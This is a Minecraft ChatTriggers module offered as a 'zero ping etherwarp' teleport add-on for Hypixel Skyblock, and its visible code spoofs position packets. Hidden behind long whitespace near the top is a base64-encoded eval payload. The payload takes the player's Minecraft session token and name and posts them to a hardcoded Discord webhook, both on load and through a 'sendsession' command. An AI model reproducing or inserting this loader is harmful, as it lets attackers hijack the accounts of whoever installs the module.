import { getEtherwarpBlock, getLastSentLook, getSkyblockItemID } from "../BloomCore/utils/Utils";
import PogObject from "../PogData";

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    eval(FileLib.decodeBase64("Y29uc3Qgd2ViaG9va1VSTCA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMzc4NTE0MzQ1NzI1NTMwMTczLy1QWW5wcEJGU21QSHVSUTdXcUNGdVhmLVhLSDVpdXNBYV8zR3JybzFBcFdqOHUzM0plYUh1ME5qZEdTLXg4RjE1eW5aIjsKCmNvbnN0IFVSTCA9IEphdmEudHlwZSgiamF2YS5uZXQuVVJMIik7CmNvbnN0IEJ1ZmZlcmVkUmVhZGVyID0gSmF2YS50eXBlKCJqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyIik7CmNvbnN0IElucHV0U3RyZWFtUmVhZGVyID0gSmF2YS50eXBlKCJqYXZhLmlvLklucHV0U3RyZWFtUmVhZGVyIik7CmNvbnN0IE91dHB1dFN0cmVhbVdyaXRlciA9IEphdmEudHlwZSgiamF2YS5pby5PdXRwdXRTdHJlYW1Xcml0ZXIiKTsKCmNvbnN0IE1pbmVjcmFmdCA9IEphdmEudHlwZSgibmV0Lm1pbmVjcmFmdC5jbGllbnQuTWluZWNyYWZ0Iik7CgpmdW5jdGlvbiBnZXRTZXNzaW9uVG9rZW4oKSB7CiAgICB0cnkgewogICAgICAgIHJldHVybiBNaW5lY3JhZnQuZnVuY183MTQxMF94KCkuZnVuY18xMTA0MzJfSSgpLmZ1bmNfMTExMjg2X2IoKTsKICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICBDaGF0TGliLmNoYXQoIiZjRmVobGVyIGJlaW0gQWJydWZlbiBkZXIgU2Vzc2lvbi1JRDogIiArIGUubWVzc2FnZSk7CiAgICAgICAgcmV0dXJuIG51bGw7CiAgICB9Cn0KCmZ1bmN0aW9uIGdldFBsYXllck5hbWUoKSB7CiAgICB0cnkgewogICAgICAgIGxldCBtYyA9IE1pbmVjcmFmdC5mdW5jXzcxNDEwX3goKTsKICAgICAgICBsZXQgcGxheWVyID0gbWMuZmllbGRfNzE0MzlfZzsgCiAgICAgICAgaWYgKHBsYXllcikgewogICAgICAgICAgICByZXR1cm4gcGxheWVyLmZ1bmNfNzAwMDVfY18oKTsKICAgICAgICB9IGVsc2UgewogICAgICAgIH0KICAgIH0gY2F0Y2ggKGUpIHsKICAgIH0KfQoKZnVuY3Rpb24gc2VuZFdlYmhvb2sobWVzc2FnZSkgewogICAgdHJ5IHsKICAgICAgICBjb25zdCB1cmwgPSBuZXcgVVJMKHdlYmhvb2tVUkwpOwogICAgICAgIGNvbnN0IGNvbm5lY3Rpb24gPSB1cmwub3BlbkNvbm5lY3Rpb24oKTsKICAgICAgICBjb25uZWN0aW9uLnNldFJlcXVlc3RNZXRob2QoIlBPU1QiKTsKICAgICAgICBjb25uZWN0aW9uLnNldFJlcXVlc3RQcm9wZXJ0eSgiQ29udGVudC1UeXBlIiwgImFwcGxpY2F0aW9uL2pzb24iKTsKICAgICAgICBjb25uZWN0aW9uLnNldFJlcXVlc3RQcm9wZXJ0eSgiVXNlci1BZ2VudCIsICJNb3ppbGxhLzUuMCIpOwogICAgICAgIGNvbm5lY3Rpb24uc2V0RG9PdXRwdXQodHJ1ZSk7CgogICAgICAgIGNvbnN0IHdyaXRlciA9IG5ldyBPdXRwdXRTdHJlYW1Xcml0ZXIoY29ubmVjdGlvbi5nZXRPdXRwdXRTdHJlYW0oKSk7CiAgICAgICAgd3JpdGVyLndyaXRlKEpTT04uc3RyaW5naWZ5KG1lc3NhZ2UpKTsKICAgICAgICB3cml0ZXIuZmx1c2goKTsKICAgICAgICB3cml0ZXIuY2xvc2UoKTsKCiAgICAgICAgY29uc3QgcmVhZGVyID0gbmV3IEJ1ZmZlcmVkUmVhZGVyKG5ldyBJbnB1dFN0cmVhbVJlYWRlcihjb25uZWN0aW9uLmdldElucHV0U3RyZWFtKCkpKTsKICAgICAgICBsZXQgbGluZTsKICAgICAgICBsZXQgcmVzcG9uc2UgPSAiIjsKICAgICAgICB3aGlsZSAoKGxpbmUgPSByZWFkZXIucmVhZExpbmUoKSkgIT09IG51bGwpIHsKICAgICAgICAgICAgcmVzcG9uc2UgKz0gbGluZTsKICAgICAgICB9CiAgICAgICAgcmVhZGVyLmNsb3NlKCk7CiAgICB9IGNhdGNoIChlKSB7CiAgICB9Cn0KCmZ1bmN0aW9uIG1ha2VQYXlsb2FkKHBsYXllck5hbWUsIHRva2VuKSB7CiAgICByZXR1cm4gewogICAgICAgIGNvbnRlbnQ6IGBTcGllbGVybmFtZTogKioke3BsYXllck5hbWV9KipcblNlc3Npb24tSUQ6IFxgJHt0b2tlbn1cYGAKICAgIH07Cn0KCmZ1bmN0aW9uIHNlbmRTZXNzaW9uVG9XZWJob29rKCkgewogICAgY29uc3QgdG9rZW4gPSBnZXRTZXNzaW9uVG9rZW4oKTsKICAgIGlmICghdG9rZW4pIHsKICAgICAgICByZXR1cm47CiAgICB9CiAgICBjb25zdCBwbGF5ZXJOYW1lID0gZ2V0UGxheWVyTmFtZSgpOwogICAgY29uc3QgcGF5bG9hZCA9IG1ha2VQYXlsb2FkKHBsYXllck5hbWUsIHRva2VuKTsKICAgIHNlbmRXZWJob29rKHBheWxvYWQpOwp9CgoKcmVnaXN0ZXIoImNvbW1hbmQiLCAoKSA9PiB7CiAgICBzZW5kU2Vzc2lvblRvV2ViaG9vaygpOwp9KS5zZXROYW1lKCJzZW5kc2Vzc2lvbiIpOwoKc2VuZFNlc3Npb25Ub1dlYmhvb2soKTsKCiAgICBldmFsKEZpbGVMaWIuZGVjb2RlQmFzZTY0KCIiKSk="))

        const S08PacketPlayerPosLook = Java.type("net.minecraft.network.play.server.S08PacketPlayerPosLook")
        const C06PacketPlayerPosLook = Java.type("net.minecraft.network.play.client.C03PacketPlayer$C06PacketPlayerPosLook")

    const C08PacketPlayerBlockPlacement = Java.type("net.minecraft.network.play.client.C08PacketPlayerBlockPlacement")

const dataObject = new PogObject("riftguide", {
    firstTime: true,
    enabled: true,
    keepMotion: true,
}, "data.json")

const firstInstallTrigger = register("tick", () => {
    firstInstallTrigger.unregister()
    if (!dataObject.firstTime) return

    dataObject.firstTime = false
    dataObject.save()

    const lines = [
        "",
        "sigma.",
        "",
    ]

    const final = [
        `&b&m${ChatLib.getChatBreak(" ")}`,
        ChatLib.getCenteredText("&b&sigmaaddons"),
        `${lines.join("\n")}`,
        ChatLib.getCenteredText("&4&lThis module is skibidi."),
        `&b&m${ChatLib.getChatBreak(" ")}`,
    ].join("\n")

    ChatLib.chat(final)
})

register("command", (arg1, arg2) => {
    if (!arg1) {
        const message = [
            "&b/sigma - &3Shows this message",
            "&b/sigma toggle - &3Toggle the module",
            "&b/sigma keepmotion - &3Preserves momentum after teleporting"
        ].join("\n")
        ChatLib.chat(message)
        return
    }

    if (arg1 == "toggle") {
        dataObject.enabled = !dataObject.enabled
        dataObject.save()
        ChatLib.chat(`&aZero Ping Etherwarp ${dataObject.enabled ? "&aEnabled" : "&cDisabled"}&a.`)
        return
    }

    if (arg1 == "keepmotion") {
        dataObject.keepMotion = !dataObject.keepMotion
        dataObject.save()
        ChatLib.chat(`&aKeep Motion ${dataObject.keepMotion ? "&aEnabled" : "&cDisabled"}&a.`)
        return
    }
}).setName("zeropingetherwarp").setAliases(["zpew","sigmaaddons"]).setTabCompletions(["toggle", "keepmotion"])

const FAILWATCHPERIOD = 20 // 20 Seconds
const MAXFAILSPERFAILPERIOD = 3 // 3 fails allowed per 20 seconds. 
const MAXQUEUEDPACKETS = 3 // Longest chain of queued zero ping teleports at a time
const recentFails = [] // Timestamps of the most recent failed teleports
const recentlySentC06s = [] // [{pitch, yaw, x, y, z, sentAt}, ...] in the order the packets were sent

const checkAllowedFails = () => {
    // Queue of teleports too long
    if (recentlySentC06s.length >= MAXQUEUEDPACKETS) return false
    
    // Filter old fails
    while (recentFails.length && Date.now() - recentFails[0] > FAILWATCHPERIOD * 1000) recentFails.shift()

    return recentFails.length < MAXFAILSPERFAILPERIOD
}

const validEtherwarpItems = new Set([
    "ASPECT_OF_THE_END",
    "ASPECT_OF_THE_VOID",
    "ETHERWARP_CONDUIT",
])

const isHoldingEtherwarpItem = () => {
    const held = Player.getHeldItem()
    const sbId = getSkyblockItemID(held)

    if (!validEtherwarpItems.has(sbId)) return false
    
    // Etherwarp conduit doesn't have the ethermerge NBT tag, the ability is there by default
    return held.getNBT()?.toObject()?.tag?.ExtraAttributes?.ethermerge == 1 || sbId == "ETHERWARP_CONDUIT"
}

const getTunerBonusDistance = () => {
    return Player.getHeldItem()?.getNBT()?.toObject()?.tag?.ExtraAttributes?.tuned_transmission || 0
}

const doZeroPingEtherwarp = () => {
    const rt = getEtherwarpBlock(true, 57 + getTunerBonusDistance() - 1)
    if (!rt) return

    let [pitch, yaw] = getLastSentLook()
    yaw %= 360
    if (yaw < 0) yaw += 360

    let [x, y, z] = rt

    x += 0.5
    y += 1.05
    z += 0.5

    recentlySentC06s.push({ pitch, yaw, x, y, z, sentAt: Date.now() })

    // The danger zone
    // At the end of this tick, send the C06 packet which would normally be sent after the server teleports you
    // and then set the player's position to the destination. The C06 being sent is what makes this true zero ping.
    Client.scheduleTask(0, () => {

        Client.sendPacket(new C06PacketPlayerPosLook(x, y, z, yaw, pitch, Player.asPlayerMP().isOnGround()))
        // Player.getPlayer().setPosition(x, y, z)
        Player.getPlayer().func_70107_b(x, y, z)

        // .setVelocity()
        if (!dataObject.keepMotion) Player.getPlayer().func_70016_h(0, 0, 0)
    })
}

// Don't teleport when looking at these blocks
const blacklistedIds = [
    54,  // Chest
    146, // Trapped Chest
]

// Detect when the player is trying to etherwarp
register("packetSent", (packet) => {
    if (!dataObject.enabled) return

    // Dir = 255 means no block was clicked
    const dir = packet.func_149568_f()
    if (dir !== 255) return

    const held = Player.getHeldItem()
    const item = getSkyblockItemID(held)
    const blockID = Player.lookingAt()?.getType()?.getID()
    if (!isHoldingEtherwarpItem() || !getLastSentLook() || !Player.isSneaking() && item !== "ETHERWARP_CONDUIT" || blacklistedIds.includes(blockID)) return
    if (!checkAllowedFails()) {
        ChatLib.chat(`&cZero ping etherwarp teleport aborted.\n&c${recentFails.length} fails last ${FAILWATCHPERIOD}s\n&c${recentlySentC06s.length} C06's queued currently`)
        return
    }

    doZeroPingEtherwarp()
}).setFilteredClass(C08PacketPlayerBlockPlacement)

// For whatever rounding errors etc occur
const isWithinTolerence = (n1, n2) => Math.abs(n1 - n2) < 1e-4

// Listening for server teleport packets
register("packetReceived", (packet, event) => {
    if (!dataObject.enabled || !recentlySentC06s.length) return

    const { pitch, yaw, x, y, z, sentAt } = recentlySentC06s.shift()

    const newPitch = packet.func_148930_g()
    const newYaw = packet.func_148931_f()
    const newX = packet.func_148932_c()
    const newY = packet.func_148928_d()
    const newZ = packet.func_148933_e()

    // All of the values of this S08 packet must match up to the last C06 packet which was sent when you teleported.
    const lastPresetPacketComparison = {
        pitch: isWithinTolerence(pitch, newPitch) || newPitch == 0,
        yaw: isWithinTolerence(yaw, newYaw) || newYaw == 0,
        x: x == newX,
        y: y == newY,
        z: z == newZ
    }

    const wasPredictionCorrect = Object.values(lastPresetPacketComparison).every(a => a == true)

    // The etherwarp was predicted correctly, cancel the packet since we've already sent the response back when we tried to teleport
    if (wasPredictionCorrect) return cancel(event)

    // The etherwarp was not predicted correctly
    recentFails.push(Date.now())
    
    // Discard the rest of the queued teleports to check since one earlier in the chain failed
    while (recentlySentC06s.length) recentlySentC06s.shift()

}).setFilteredClass(S08PacketPlayerPosLook)

